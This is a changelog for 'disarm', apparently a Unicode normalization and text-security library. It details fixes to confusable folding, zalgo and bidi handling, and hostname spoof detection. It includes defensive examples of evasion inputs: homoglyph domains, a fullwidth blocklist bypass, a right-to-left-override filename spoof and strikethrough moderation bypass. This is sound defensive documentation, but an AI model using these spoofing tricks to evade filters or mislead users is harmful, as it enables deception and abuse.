# Changelog

All notable changes to this project will be documented in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Version numbers use the `MAJOR.MINOR.PATCH` shape but follow disarm's own
[release policy](RELEASING.md) — patch = fixes/cleanups/docs, minor = features
or major refactors, and the major component denotes **support status**, not API
compatibility (see [RELEASING.md](RELEASING.md)).

> **Project renamed `translit` → `disarm` (#264).** Historical entries below
> predate the rename and refer to the old identity (`translit-rs` on PyPI, the
> `translit` import package, the `_translit` native module); they are left
> unchanged because they were accurate for their release. Entries from this
> point on use the `disarm` identity.

## [Unreleased]

### Upgrade notes

**`is_mixed_script` and the hostname screen no longer call ordinary Japanese, Korean or
Chinese "mixed" (#776).** They now resolve the UTS #39 §5.1 augmented script sets, which
`inspect_anomalies` has applied all along. If you store or compare the output of either,
re-evaluate: `is_mixed_script("日本語テスト")` was `True` and is now `False`, and
`is_suspicious_hostname("例え.jp")` no longer reports `mixed_script`.

This *reduces* what those two surfaces flag, so a caller relying on them to catch Han +
Kana loses that. It was never a spoofing signal — it fired on every Japanese domain name
— and the detector already declined to report it, which is what made the three surfaces
contradict each other. Anything without a writing system in common is still mixed,
including CJK beside a non-CJK script.

**Stored `canonicalize` output moves for Burmese and other complex scripts (#842).** The
zalgo bound now counts marks per canonical combining class rather than per base, so 142 of
the 22,963 key-stability rows move on `canonicalize` and `canonicalize_strict`, and 38 on
`strip_obfuscation`. Every one is a Myanmar place name **regaining** a tone mark the old
bound deleted, so a reindexed key is strictly closer to its input. `search_key`,
`catalog_key`, `sort_key` and `fold_case` are byte-identical — they transliterate Myanmar
before the step runs.

**Stored `canonicalize` output moves for Indic, Hebrew and Arabic text (#788).**
`strip_zalgo`'s cap rose from 2 to 3 so it stops stripping from text `is_zalgo` calls
ordinary. 351 of the 22,878 key-stability rows move on `canonicalize` and 340 on
`canonicalize_strict`, dominated by Myanmar, Sinhala and Bengali clusters the old cap
truncated. **No row lost a mark** — every change restores something previously cut, so a
reindexed key is strictly closer to the input. `search_key`, `catalog_key`, `sort_key` and
`fold_case` are byte-identical. `KEY_SCHEMA_VERSION` goes 1 → 2; if you persist
`canonicalize` output as a comparison value, reindex.

**Stored comparison output moves for Greek and Cyrillic text (#801).** Closing the
confusable table's case asymmetry moved 1,202 of the 22,878 rows in the key-stability
fixture, 5.25%. The four affected functions are `canonicalize`, `canonicalize_strict`,
`strip_obfuscation` and `normalize_confusables` — all comparison surfaces. **The three key
builders do not move at all**: `search_key`, `catalog_key` and `sort_key` are
byte-identical on every one of the 22,878 rows, as is `fold_case`, because they
transliterate before folding and Greek `τ` already reached `t` that way. If you persist
`canonicalize` output as a comparison value, reindex; if you persist a *key*, you do not.

Almost every moved row is a lowercase letter that now folds where its capital always did:
Greek `τ` → `t` (`Άντρας` canonicalized to `Άvτpaς`, now `Άvtpaς`), Cyrillic `т` → `t`,
`н` → `h`, `м` → `m`. The old output was the inconsistent one — it folded `ν` to `v` and
`ρ` to `p` in the same word while leaving `τ` alone.

One hostname detail moves with it: a label spelled entirely in Cyrillic now reports
`whole_script_confusable`, which under UTS #39 it always was. `москва.рф` is the example.
The documented caller policy — a non-TLD label is whole-script-confusable **and** the TLD
is Latin/ASCII — is unaffected and still says no, because the TLD is Cyrillic. Measured
across 41 hostnames (25 legitimate single-script domains, six ASCII, ten known spoofs),
`is_suspicious_hostname` changed its verdict on five: every one a spoof, every one
`false` → `true`.

**The declared MSRV was wrong and is now 1.88 (#718).** `Cargo.toml` published
`rust-version = "1.81"` and nothing in CI ever built at it. The real floor is set by a
*runtime* dependency, not a dev one: `idna` pulls in `idna_adapter`, which pulls in
`icu_normalizer` / `icu_properties` / `icu_provider`, all declaring `rust-version = "1.88"`
— and `idna_adapter` 1.2.2 uses edition 2024, which cargo below 1.85 cannot parse at all.
A consumer on 1.81 did not get a subtle compile error; cargo refused to read the manifest.
Measured: `cargo +1.81`, `+1.85` and `+1.87` all fail on a minimal consumer of this crate,
`+1.88` succeeds. This is a correction to a claim that was already false, not a raise.

**Stored `strip_obfuscation` output moves (#757).** 60 of the 22,878 rows in the key
stability fixture changed, 0.26%. Every one is a character that stopped being replaced by
its English name: the katakana middle dot in Japanese names (`アテネ・トラム` was
`アテネ katakana middle dot トラム`), the low-9 quotation mark in Central European
titles, the dashes. `search_key`, `catalog_key` and `sort_key` do not run the emoji step
and are unaffected. If you have persisted `strip_obfuscation` output as a key, reindex.

**`ml_normalize` output moves for 326 code points (#757).** Typographic punctuation,
currency signs and math operators are no longer replaced by English words. Text that was
already ASCII is unaffected. Pass `emoji="none"` to suppress the emoji step entirely, as
before.

**`is_suspicious_hostname` flags far more, and `canonical` moves (#709, #714).** Both
changes stop the analysis normalizing away the thing it is supposed to analyse.

Measured over every code point built as `X.com`:

| | assigned (292,531) | unassigned (819,533) |
|---|---|---|
| newly suspicious | **6,178** — 3,647 a compatibility form, 2,531 DISALLOWED by UTS #46 | **814,676** |
| no longer suspicious | **68** | 0 |
| `canonical` changed | **2,191** | — |

The unassigned bucket is the largest number and the least interesting: an unassigned code
point cannot appear in a resolvable hostname, and UTS #46 says so. It used to pass.

The 68 losses are all **uppercase letters** whose lowercase form is not in the bundled
Latin confusable table — `Ð`, `Λ`, `М`, `Ⴀ`, `ẞ`. UTS #46 case-folds, so the analysis now
runs on the form the name actually resolves to, and the ACE spelling of each was already
clean. They are a gap in `confusables_to_latin.tsv`'s lowercase rows, now visible, and filed as
[#801](https://github.com/raeq/disarm/issues/801) — 86 rows in the table, 68 of them
screening clean in both spellings. **Fixed in this release**, see below: 24 of the 30
pairs upstream lists are now folded, and `Т.com` and `т.com` both screen again.

`canonical` is also lowercased for the same reason: `GOOGLE.COM` canonicalizes to
`google.com`. If you compare `canonical` against a brand list, case-fold the list.

**`HostnameAnalysis` gains a `compat_fold` field** on every binding. The Rust struct is
`#[non_exhaustive]`, so that is additive; the **Java record's constructor arity changes**
from 12 to 13, which is source- and binary-breaking for anyone constructing one directly
(reading it is unaffected).

### Added

- **Asking `disarm` for an outcome name now teaches the naming rule (#654).** `clean`,
  `sanitize`, `safe`, `secure`, `escape`, `is_safe` and `make_safe` will never exist —
  CONTRIBUTING.md's rule is that a public name describes the operation and never the
  outcome. That left a reader who reached for one holding a bare `AttributeError` at
  exactly the moment they were asking the question the threat model answers:

  ```text
  >>> disarm.clean
  AttributeError: disarm has no 'clean', and will not: a public name here describes the
  operation, never the outcome. Nothing in this library makes text safe to emit.

    comparison / canonical form   canonicalize()
    display-safe cleanup          strip_format()
    untrusted LLM input           get_pipeline("llm_guardrail")
    output safety                 encode at the sink — see THREAT_MODEL.md
  ```

  It refuses and explains in the same breath, so it promises nothing and stays compatible
  with the rule it teaches. Every other missing name gets the ordinary message unchanged,
  and the exception keeps its `name` and `obj` so REPL "did you mean" tooling still works.

  #654's two preconditions are tests rather than assumptions: nothing requires `dir()` and
  `getattr()` to agree — `hasattr`, `getattr(..., default)` and `__all__` all behave as
  before — and the hook cannot mask an `AttributeError` raised from inside an import,
  checked in a subprocess against a genuinely failing one.

- **`target_script="arabic"` and `"hebrew"` (#792).** Generation drops an equivalence class
  entirely when no member belongs to the target script, so a class whose members are all
  Arabic folded to nothing under either shipped table — 948 of TR39's 1,007 strong-RTL
  sources were in that position (#791). These give them somewhere to land: **373 rows** and
  **261 rows** of cross-script punctuation, letterlike symbols and digits.

  Opt-in, like `cyrillic`. No preset consumes a non-Latin target, so this adds a view
  rather than changing any existing answer — which is what resolved the blocking question
  #792 §1 raised about colliding with #735.

  **They do not reach an intra-Arabic pair.** #792 was filed believing an Arabic target
  would fold Persian keheh onto Arabic kaf; prototyping it first showed all four code
  points in its motivating table absent from the generated table, because both members of
  each pair are already in the target script. TR39 does put them in one class — the data is
  not the problem, the cross-script model is. Split out as #848, which needs the generator
  to stop discarding same-script classes, and which is #831's machinery one script over.

  `is_suspicious_hostname` is unaffected and says so: it computes whole-script-confusable
  against Latin with the fold's target hardcoded, so an Arabic label whose skeleton stays
  Arabic cannot qualify whatever these tables hold.

- **`has_bidi_control` — is there a bidi formatting character in this text? (#778)** The
  question was answerable only through `inspect_anomalies`, and only for nine of the
  twelve. `has_bidi_conflict` answers a different question: it is about text *mixing*
  strong LTR and strong RTL content, which is a property of the content rather than of the
  controls. A caller wanting "does this string carry a bidi control at all" had to
  enumerate the twelve themselves.

  | | asks |
  |---|---|
  | `has_bidi_conflict` | does the text mix strong LTR and strong RTL content? |
  | `has_bidi_control` | is any of the twelve explicit formatting characters present? |

  Measured rather than taken from the issue, which said six: `inspect_anomalies` answers
  **9 of 12** — #741 added LRE, RLE and PDF after the issue was written. The three still
  held back are the directional *marks*, LRM, RLM and ALM, and deliberately: a lone
  directional mark is ordinary in RTL text, so reporting it as an anomaly would be noise.
  `has_bidi_control` has no such judgement to make and reports all twelve.

  Available on every surface — Rust, Python (free function and `Text.has_bidi_control`),
  Ruby as `bidi_control?`, Node as `hasBidiControl`, Java/Kotlin as `hasBidiControl`, and
  the C ABI as `disarm_has_bidi_control`.

- **`UNICODE_VERSION` and `KEY_SCHEMA_VERSION`, on all seven surfaces (#645, #642, #644).**
  #641, #642 and #644 were filed separately and are one failure repeated: disarm knows
  something an integrator needs and has no channel to say it. `CONFUSABLES_VERSION` (#560)
  is the first instance and the plumbing was already finished, so this extends it rather
  than building a mechanism.

  `UNICODE_VERSION` is the UCD the **normalizer** implements. Not a library-wide version —
  there is none, because the bundled tables track different releases — but the scope for
  which one number is correct, and the one integrators ask about: *will my normalization
  agree with the host platform's?* Usually not, since disarm tracks a newer UCD than most
  shipped CPythons. Emitted by `build.rs` from `unicode-normalization`'s own constant, the
  same discipline `CONFUSABLES_VERSION` uses, so it cannot drift from what it names.

  `KEY_SCHEMA_VERSION` is a monotonic counter, not a version: two artifacts reporting the
  same value produce the same key for the same input, and different values mean reindex.
  Meaningless in isolation by design. It covers all eight functions the key-stability
  fixture tracks, not only the three named "key builders" — a stored `canonicalize` value
  is as much a key as a stored `search_key` one. The counter is kept honest by that
  fixture (#644): the version is written into its header at generation time and a test
  fails when the constant and the header disagree, so regenerating without bumping is red
  rather than a silent lie. Verified in both directions.

  This reverses a decision the repository had written down and tested. `test_confusables_version.py`
  asserted `not hasattr(disarm, "UNICODE_VERSION")`, to force whoever added that name to
  reckon with the per-table versions first. #645 is that reckoning; the test is rewritten
  to guard what still matters — that the constant is scoped to the normalizer, and that no
  third constant appears claiming to cover the artifact as a whole.

- **The gaps the parity matrix found, on the surfaces that had them (#698, #707, #677,
  #660).** `strip_format` reached only Rust and Python: the seven universal `strip*`
  primitives cannot be composed into it: its invisibles policy is a private constant, and
  the difference from a naive chain runs in both directions — `strip_format` preserves the
  Private Use Area and the `U+FE0E`/`U+FE0F` presentation selectors after a base, which
  the chain deletes, and it collapses TAB/LF, which the chain leaves alone. A caller on
  Node, Ruby, the C ABI or the JVM had no route to the behaviour at all. It is now on all seven. `sanitize_filename` — the one entry point
  whose whole purpose is a filesystem sink, and where transliteration neutralizes 19 of
  the 53 vectors in the attacker battery rather than the denylist (#601) — was missing
  from the C ABI, the surface most likely to be feeding one. `canonicalize_strict`, the
  half of the pair that lets a caller reject input instead of comparing a value the
  sender never wrote, is now on Node, Ruby, the C ABI, Java and Kotlin. On the Python
  side `LANG_AUTO` was the single `LANG_*` constant of eighty-four that `__init__.py`
  never re-exported, while three doc blocks told the reader to import it;
  `test_api_stability.py` had frozen its absence as correct.

- **A parity gate that fails (`tests/test_parity_floor.py`).** The existing parity check
  re-seeds the same matrix and emits warnings, deliberately — a security release must
  never wait on interface parity — so the four gaps above sat in the matrix while every
  run stayed green. The new gate is narrow enough to keep that property: it asserts a
  fixed floor of 38 operations that are complete on all seven surfaces and must stay so,
  and leaves the whole 79-row matrix to the advisory check. `tests/test_lang_constant_exports.py`
  does the same for the constants, enumerating `_enums.pyi` rather than `dir(disarm)` —
  reading the runtime for the expected set would have made the defect invisible.

- **`code_context` — a profile whose output is still source code (#746).** disarm claims
  two source-code CVEs and points LLM-stack authors at the guardrail path, and shipped no
  entry point that returns compilable code. Every one of the eleven presets and both LLM
  profiles ends in `collapse_whitespace`, which folds LF to a space by design (#433):
  measured over the 465 files of this repository, all thirteen collapse every file to a
  single line, and 147 of 287 Python files stop parsing.

  **Line count, indentation and case are the contract**, not a side effect. `strip_bidi` +
  `strip_zero_width` + `strip_control`, and nothing else — no `collapse_whitespace`, no
  `fold_case`, no NFKC, no confusable fold.

  ```python
  code = get_pipeline("code_context")
  cleaned = code(trojan_source_c)
  assert cleaned.count("\n") == trojan_source_c.count("\n")
  assert "\u202e" not in cleaned
  ```

  **The confusable fold cannot run on code, and that is the design rather than an
  omission.** Exactly three ASCII code points are TR39 sources (#725): `"` folds to two
  apostrophes, the backtick to one, and `|` to `l`. All three are load-bearing syntax, so
  `normalize_confusables` breaks 287 of 287 Python files here while preserving every line.
  The profile is therefore **strip-and-report**: it neutralises the invisible, bidi and
  control classes, and the homoglyph and compatibility classes are reported by
  `inspect_anomalies`, `is_confusable` and `is_mixed_script` rather than rewritten.
  arXiv:2503.14281v4 §E rules rewriting out on quality grounds for the same reason.

  The invariants are gated over the whole repository, which is what the CVE gate could not
  do — both its Trojan Source vectors are single lines. `docs/user-guide/llm-pipelines.md`
  carries the strip-and-report split, and the two source-file rows in
  `docs/security/cve-validation.md` link to it.

  Drive-by: `python/disarm/_presets.py` emitted a `SyntaxWarning` on import — a backslash
  in a non-raw docstring, introduced by my own #719 edit, and the second of that class this
  cycle after `\w` in #712. A repository-wide gate now fails on any of them.

- **`find_confusables()` — the mapped confusables in a string, with offsets (#737 §3).**
  The mirror of `find_unmapped_confusables`: that one answers *what would survive the
  fold?* — exposure — and this one answers *what did the fold change, and to what?* —
  evidence. `is_confusable` returns a bare bool and `normalize_confusables` returns the
  folded string; neither says **where**, and diffing the two does not work because the
  fold is not length-preserving (`ﬁ` becomes `fi`).

  ```python
  find_confusables("pɑypal")  # [('ɑ', 1, 'a')]
  find_confusables("paypal")  # []
  ```

- **`stream_safe()` and `is_normalized_stream_safe()` — UAX #15 Stream-Safe Text Format.**
  The standard bounds a run of non-starters at 30 so text can be processed in fixed-size
  buffers without a normalization boundary landing inside one. `unicode-normalization`
  already shipped the implementation; disarm did not expose it.

  This is an **interoperability** primitive, and the docs lead with what it is not:

  - **Not canonically equivalent.** It inserts `U+034F`, so `stream_safe(s) != s` and the
    normalized forms differ. Never build a comparison key from it.
  - **Not a zalgo control.** 30 non-starters is far above stacking abuse, and it makes no
    judgement about whether text is abusive — `strip_zalgo()` answers that. Eight stacked
    marks pass straight through, as do Hebrew points, Arabic harakat and Indic conjuncts.
  - **Not a size bound.** The presets already cap produced output (#768).

  The predicate is a **conjunction**: `is_normalized_stream_safe(text, form=...)` answers
  "is this normalized *and* stream-safe". That is what the underlying Unicode predicate
  computes — its own documentation reads "is Stream-Safe NFC" — and the name says so
  rather than leaving a caller to find out from the source.

  Rust and Python only. The parity matrix now reports the four remaining bindings as gaps,
  which is the mechanism working rather than an oversight.

- **`digit_policy="preserve"` — leave the numeral in its own script (#648).**
  The two existing settings are not "keep the script" and "fold to ASCII"; both rewrite a
  non-Latin numeral, and both leave a *mixed-script* result, which is neither:

  ```
  normalize_confusables("२०२४")                          ->  '२0२४'   numeric
  normalize_confusables("२०२४", digit_policy="tr39")     ->  '२o२४'   tr39
  normalize_confusables("२०२४", digit_policy="preserve") ->  '२०२४'   #648
  ```

  It declines the digit rows and folds everything else as usual, so a homoglyph attack is
  still neutralized — `раypal` still becomes `paypal`. Unlike `"tr39"` it applies under
  every target script, because declining to fold is not a Latin-specific act.

  No new table. "The digit rows" are the rows whose target is a single ASCII digit, which
  the bundled map already states, so the set is read off the live table rather than
  duplicated beside it and cannot drift from it. #648 proposed a third per-code-point
  file; the two shipped tables disagree about which sources are digit rows — 157 in the
  Latin map, 66 in the Cyrillic, neither a subset of the other — so that file would have
  had to be per-target as well.

  Available on every surface: `DigitPolicy::Preserve` (Rust), `digit_policy="preserve"`
  (Python, C ABI), `'preserve'` (Node, widening the `DigitPolicy` union), `:preserve`
  (Ruby), `DigitPolicy.PRESERVE` (Java/Kotlin).

### Changed (breaking)

- **`sort_key` bounds combining marks (#807).** It was the one key builder with neither
  `strip_zalgo` nor `strip_accents`, so nothing bounded them:
  `sort_key("a" + U+0301 × 40 + "b")` returned 41 characters and `has_anomalies` called
  its own output `zalgo`. Two properties were wrong at once — a key builder under a
  stability contract emitting flagged output, and its **length set by the attacker**:
  1,000 marks in produced 1,001 characters out.

  Capping rather than stripping is what makes this possible without destroying the
  function. `search_key` and `catalog_key` are clean only as a side effect, because
  `strip_accents` removes the marks, and that route is closed here: keeping diacritics is
  what a sort key is *for*, and `café` and `cafe` must not collide.

  The cap is `DEFAULT_MAX_MARKS`, which since #788 equals `is_zalgo`'s threshold, so it
  removes exactly what the library already calls abuse and nothing it calls ordinary. That
  ordering was not optional: with the old cap of 2 this step would have truncated a
  three-mark Bengali cluster or a pointed Hebrew consonant inside a key builder.

  **No key moves.** The step sits after transliteration, and `sort_key` romanises
  non-Latin text before reaching it, so all 22,963 corpus rows are byte-identical. What
  remains for it to bound is a Latin-script stack, which is exactly where the
  amplification lives. `KEY_SCHEMA_VERSION` is unchanged.

- **`strip_zalgo`'s cap now equals `is_zalgo`'s threshold (#788).** It was 2 while the
  threshold was 3, so the library removed a mark from text it had just declined to call
  suspicious:

  ```python
  is_zalgo("\u05d0\u05b8\u05c1\u0591")  # False — ordinary pointed Hebrew
  strip_zalgo(...)  # the etnahta was removed anyway
  ```

  Pointed and cantillated Hebrew routinely puts a vowel, a dot and an accent on one
  consonant, and the same shape appears in Arabic with shadda + a short vowel + sukun. The
  direction is forced: lowering the threshold would make `is_zalgo` call Torah text zalgo,
  so the cap rises. That serves #429's stated goal — the cap exists to preserve legitimate
  diacritics — rather than reversing it.

  **The measured impact is wider than the issue predicted, and in a different script
  family.** #788 checked three short Indic and Thai samples and concluded Indic was
  unaffected. Over the 22,878-row key-stability corpus, 351 `canonicalize` rows and 340
  `canonicalize_strict` rows move, dominated by **Myanmar, Sinhala and Bengali** — clusters
  carrying a nukta, a vowel sign and an anusvara, which the old cap truncated:
  `ইয়াং` came back as `ইয়া`. **No row lost a mark**; every moved row is text that had been
  cut short.

  Breaking because `canonicalize` and `canonicalize_strict` are byte-stable aliases (#430)
  and a stored key moves. `KEY_SCHEMA_VERSION` goes 1 → 2. `strip_obfuscation` and
  `ml_normalize` are unaffected: their caps are 0 by design and were never the default.
  `search_key`, `catalog_key`, `sort_key` and `fold_case` do not run the step and are
  byte-identical.

  Both canonicalizers now take the cap from the constant instead of repeating the figure,
  and `docs/limitations.md` gains a section saying where the bound still bites — a fourth
  mark on one base is still removed, deliberately, and `max_marks` is the parameter for
  text where that is ordinary.

- **The key builders strip the invisible classes (#805).** `search_key`, `catalog_key` and
  `sort_key` passed noncharacters through unchanged, so inserting one varied the key
  without varying anything a human sees. `canonicalize`, `strip_obfuscation` and
  `strip_noncharacters` always stripped them, which made this an asymmetry inside the
  library rather than a missing capability — and until #774 the detector reported it, but
  only as a side effect of the script mislabel that #774 correctly fixed.

  **The class is wider than the issue measured.** Before the fix:

  | class | `search_key` | `catalog_key` | `sort_key` |
  |---|---|---|---|
  | noncharacters | evades | evades | evades |
  | tag characters | evades | evades | evades |
  | PUA, supplementary planes | evades | evades | evades |
  | PUA, BMP | ok | ok | ok |
  | variation selectors | ok | ok | evades |
  | CGJ | ok | ok | evades |

  BMP private-use was already handled, so a spot check with `U+E000` came back clean and
  the class looked covered. The Tags block is the ASCII-smuggling channel #700 gave the
  *detector* and never gave the key builders.

  One step fixes all of it, because it is one class: `StripInvisible(COMPARISON_STRIP)` —
  the policy `canonicalize` already uses. Fixing only noncharacters would have left tags
  and supplementary PUA evading, which is a worse place to stop than either end.

  A well-formed emoji flag keeps its tag sequence, per the #413 carve-out: those tags are
  the character rather than smuggling, and stripping them would collapse every regional
  flag onto one black flag.

- **The CLDR name table only fires for code points that are actually emoji (#757).**
  CLDR `annotationsDerived` names 326 characters that carry neither the Unicode `Emoji`
  nor the `Extended_Pictographic` property — the curly quotes, the dashes, the currency
  signs, the math operators, the CJK brackets. `ml_normalize`, the preset documented for
  tokenizers and embeddings, expanded all of them, and #614's precedence fix had reached
  only the comparison preset.

  ```
  ml_normalize("film’s")          'film right apostrophe s'  ->  'film’s'
  ml_normalize("tickets cost €12") 'tickets cost euro 12'    ->  'tickets cost €12'
  strip_obfuscation("a†b")        'a dagger signb'           ->  'a†b'
  ```

  A 30-word English sentence carrying nothing but typographic punctuation came back as
  47 words. That is the spurious-token-insertion mechanism
  `docs/security/adversarial-defense.md` disqualifies `unidecode` for, and a finding
  disarm cites against another library has to hold against disarm. The page now says so.

  `demojize` called directly is unchanged — `demojize("I ❤ €5")` is still
  `"I red heart euro 5"`, which #614 already settled — as is the explicit
  `TextPipeline` `DEMOJIZE` step, where the caller asked for the name by name.

  The two suppression rules are separate flags because they are separate sets: six of
  #614's 49 rows (`‼ ⁉ ℹ ➕ ➖ ➗`) are genuine emoji, so neither contains the other.

  The set is derived at build time as a difference against the pinned UCD, not curated,
  and `build.rs` asserts its size — a CLDR refresh that annotates more punctuation fails
  the build instead of silently suppressing another character.

- **A negation overlay is no longer treated as an accent (#749).** `strip_accents` removed
  every `Mn`. `U+0338 COMBINING LONG SOLIDUS OVERLAY` and `U+20D2` are not diacritics — on
  a relation symbol they *are* the negation, so removing one left the positive operator.
  `≠` became `=`, and every surface running the step emitted output asserting the opposite
  of its input, across 45 code points.

  ```
  strip_accents("≠")        '='   ->  '≠'
  catalog_key("∄")          'e'   ->  '∄'      (∄ → ∃ → e)
  ml_normalize("∦")   'parallel'  ->  '∦'
  ```

  **The rule reads the base, not the code point.** All 45 composed negations sit on a
  symbol (`Sm` 44, `So` 1); the same `U+0338` on a *letter* is strikethrough obfuscation,
  which `strip_obfuscation` exists to remove. A blanket exemption would have preserved
  `H̸a̸t̸e̸` too, and that is a moderation bypass — the existing test for it is what caught
  the first attempt.

  Applies to the zalgo mark-strip as well as `strip_accents`: `strip_obfuscation` uses
  `Step::Zalgo(0)`, which stripped every mark, so fixing only `strip_accents` left 20 of
  the 45 still inverting.

  **Exactly one overlay per base.** A relation carries a single stroke; a *run* of them is
  stacking whatever the base is. Exempting the whole run let `"=" + "\u0338" * 1000`
  through `Zalgo(0)` intact — a cap bypass. Overlays after the first are counted like any
  other combining mark.

  Idempotence is unaffected, which #467/#498 closed and #749 §4 asks to confirm. Two Rust
  tests asserted the inverted targets and are updated: `catalog_key`'s cascade test, and
  an `ml_normalize` test whose 17 rows each named a negated relation as its positive.

  One residual is asserted as a known negative rather than fixed: `U+2ADC` is a
  composition exclusion, so NFKC leaves it decomposed and the transliterate step drops the
  orphaned overlay. That is a third mechanism and belongs in its own change.

- **`is_suspicious_hostname` analyses the hostname it was given, not the one NFKC left
  behind (#709, #714).** Two defects, one root cause: the function normalized before it
  analysed, so every per-label check ran on a string the caller never held.

  **#709 — compatibility forms.** NFKC ran first, so the compatibility form was destroyed
  before any check could see it, and the two detectors returned opposite verdicts on the
  same string:

  ```
  inspect_anomalies("ｇoogle.com").kinds   ['compat_fold']
  is_suspicious_hostname("ｇoogle.com")    False        ->  True
                          .canonical      'google.com'      'google.com'
  ```

  `canonical` differing from the input was the analysis proving to itself that a fold had
  happened, while the verdict said clean. The new `compat_fold` field is the only one read
  from the raw input. The predicate is RFC 5892 §2.1's, applied **per code point** —
  `toNFKC(c) != c` is DISALLOWED in an IDN label — so it folds into `suspicious` on the
  same footing as `bidi_control` and `has_invisible`, with no legitimate case to protect.
  Per character rather than "NFKC changed the label", which would fire on `한국.kr` written
  with conjoining jamo. The threat is a blocklist bypass rather than a lookalike:
  `ｅvil.com` is absent from a blocked set, screens clean, and resolves to `evil.com`.

  **#714 — UTS #46 ran on the `xn--` branch only.** A label written in literal Unicode went
  to script and confusable analysis unmapped, so the two spellings of one registered
  domain were two different inputs across **561 code points**:

  ```
  is_suspicious_hostname("ꭰꭰ.com")        False -> True     canonical 'ꭰꭰ.com' -> 'DD.com'
  is_suspicious_hostname("xn--58da.com")  True     True     canonical 'DD.com'
  ```

  That is the CVE-2026-17084 row (#713): UTS #46 folds `U+AB70` toward `U+13A0`, which
  disarm maps to `D`, so only the ACE spelling ever reached the whole-script-confusable
  check — and the literal spelling is exactly what an affected pipeline emits.

  The NFKC was not a substitute and was actively wrong: for `ϲ` U+03F2 it produces `ς`
  U+03C2 where UTS #46 produces `σ` U+03C3, so the label reaching the confusable check was
  neither spelling's real form. Labels are now split on the UTS #46 separator set
  (`.`, `U+FF0E`, `U+3002`, `U+FF61`) and the raw label reaches `domain_to_unicode`
  intact. NFKC still runs for the IPv6-literal test, which is a structural question.

  Measured after the fix over all 157,188 spelling pairs: **zero** analysis differences and
  **zero** `canonical` differences, against 561 verdict disagreements before.

  The invisible-character strip (#605) moved in front of the mapping and runs again after
  it. UTS #46 gives ZWSP, the word joiner, `U+FEFF`, `U+180E` and the variation selectors
  the IGNORED disposition — the mapping deletes them silently, so a check placed only
  after it can never fire on a literal spelling, and a punycode label can decode into one.

  `compat_fold` is read per **label**, not over the whole hostname: three of the four
  UTS #46 separators carry a compatibility decomposition (`U+FF0E` and `U+FF61` do,
  `U+3002` does not), and a separator is structure rather than label content.

  `compat_fold` is surfaced on Python, Node, Ruby, Java/Kotlin and the C ABI (#549, #553).
  The Ruby tuple's last two fields are now a nested pair: magnus implements `IntoValue` for
  tuples up to arity 12, and this was the thirteenth. The hash `analyze_hostname` returns
  is unchanged.

  `has_confusables` gains the clause it was missing (#709 §6): it is read after the
  mapping, so it cannot see a compatibility form by construction, and `False` beside a
  changed `canonical` is the correct answer rather than a defect.

- **`slugify(allow_unicode=True)` keeps letters, digits and marks — and nothing else
  (#712), and cuts on a grapheme boundary (#711).** Both public descriptions promised a
  category restriction — "keep non-ASCII **letters**" (Python), "keep Unicode **word
  characters**" (Rust) — and the filter applied none. Every non-ASCII, non-whitespace code
  point survived, whatever its category, while the default ASCII path screened all of them:

  ```
  slugify("file\u202Egnp.exe", allow_unicode=True)   'file\u202egnp-exe'  ->  'file-gnp-exe'
  slugify("a\u200Bb", allow_unicode=True)            'a\u200bb'            ->  'a-b'
  slugify("a\uFFFEb", allow_unicode=True)            'a￾b'           ->  'a-b'
  slugify("Hello 👋 World", allow_unicode=True)      'hello-👋-world' ->  'hello-world'
  ```

  `'file\u202egnp-exe'` renders as `fileexe.png`, and the slug is then the URL, the anchor text
  or the filename. Turning on `allow_unicode` turned the whole screen off at once, which is
  unlikely to be what a caller asking to keep the original script believed they were opting
  into.

  The kept set is `L* | N* | M*` plus the two joiners. That matches
  `django.utils.text.slugify(allow_unicode=True)`, which keeps `\w`, with two deliberate
  additions Django does not make:

  - **Combining marks**, capped at two per base. Django drops them, which breaks Devanagari
    and Arabic. Two is the cap the `Step::Zalgo(2)` presets use, and what Vietnamese `ệ`
    needs; 30 stacked marks on one base used to survive intact.
  - **ZWJ and ZWNJ**, between two other kept characters — orthographically required, so
    dropping them changes the word. They are never emitted at a token edge, where they
    would be invisible padding.

  **The `max_length` cut lands on a grapheme-cluster boundary (#711).** It landed on a code
  point boundary, so it could fall inside a cluster and emit the invisible character the
  rest of the library exists to remove:

  ```
  slugify("한국어", allow_unicode=True, max_length=6)      '한국'   (unchanged)
  slugify("क\u094Dषि", allow_unicode=True, max_length=9)   'क्ष'  ->  ''
  ```

  A cluster is kept whole or dropped whole, so a budget below the first cluster yields an
  empty slug — the same outcome an all-stopword input already produces. `word_boundary=True`
  is fixed with it: it called the same code-point floor, then looked for a separator that
  was not there. `max_length` stays measured in bytes; what changed is where the cut lands.
  The ASCII path keeps its cheap code-point route, where the two boundaries coincide.

  Side effect: the `slugify_unicode` form-invariance tail is now **empty**. It held four
  code points (`U+037E`, `U+1FEE`, `U+1FEF`, `U+1FFD`) whose raw spelling slugged
  differently from their normalized form; all four are punctuation the category filter now
  drops in both spellings.

- **Bidi direction now comes from `Bidi_Class`, not a five-name script list (#773).**
  `strong_dir` resolved direction by looking a character's *script name* up in
  `RTL_SCRIPTS = ["Hebrew", "Arabic", "Syriac", "Thaana", "NKo"]`. UAX #9 resolves it from
  `Bidi_Class`, and the two answer different questions: **1,786 of the 3,018** assigned
  code points with `Bidi_Class` in {R, AL} resolved to no script at all, so they were
  bidi-neutral to disarm while reordering normally on screen. Two entire Arabic blocks
  were among them, along with every astral RTL script — Cypriot, Phoenician, Kharoshthi,
  Mende Kikakui, Old Turkic. All of them are now seen.

  Two behaviour changes fall out, both toward UAX #9:

  `has_bidi_conflict` now reports a bare `U+200F` RIGHT-TO-LEFT MARK, which is
  `Bidi_Class` R. The `bidi_mixed` anomaly kind does **not** — it has always described
  itself as mixing strong-directional *letters*, and got that for free while direction
  came from a script lookup. That restriction is now stated rather than inherited from an
  approximation. Whether the detector should spare a bare mark is #741's question.

  A combining mark is no longer strong. `U+0651` ARABIC SHADDA is `Bidi_Class` NSM, which
  UAX #9 rule W1 gives the direction of the preceding character; after Latin `a` that is
  L. It used to read as strong-RTL because it sits in the Arabic block, which is why
  `has_bidi_conflict` left CVE-2017-7833's detector list in
  `docs/security/cve-validation.md`. That row's coverage is unchanged — the mark is a
  mixed-script signal, and `has_anomalies`, `is_mixed_script` and `is_suspicious_hostname`
  all still fire on it.

  The explicit `is_numeric()` guard is gone with the list it protected. `AN` is simply not
  a strong class, so Arabic-Indic digits are neutral without a special case — and the
  guard was too broad, since Devanagari digits are `Bidi_Class` L and beside RTL text
  genuinely are a conflict.

- **The confusable fold no longer contradicts itself inside an uppercase block (#734).**
